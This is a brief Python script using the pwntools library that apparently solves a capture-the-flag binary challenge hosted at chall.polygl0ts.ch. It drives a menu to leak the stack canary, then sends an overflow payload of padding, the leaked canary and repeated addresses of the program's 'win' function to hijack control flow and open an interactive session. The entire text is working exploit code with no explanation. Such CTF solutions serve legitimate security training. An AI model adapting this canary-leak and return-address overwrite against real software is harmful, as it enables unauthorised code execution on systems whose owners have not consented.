from pwn import * 
#p = process("./main")
p=remote("chall.polygl0ts.ch", 6100)
elf = ELF("./main", checksec=0)
p.sendline("1")
p.sendline("88")
p.sendline(b"A"*88)
p.sendline("0")
p.sendline("11")
p.sendline("1")
print(p.recvline())
print(p.recvline())
p.recvuntil("read: ")
canary = p.recv(8)
canary = u64(canary.ljust(8,b"\x00"))
print(hex(canary))
payload = b"A"* 88 + p64(canary) + p64(elf.sym.win) * 2
p.sendline("150")
p.sendline(payload)
p.interactive()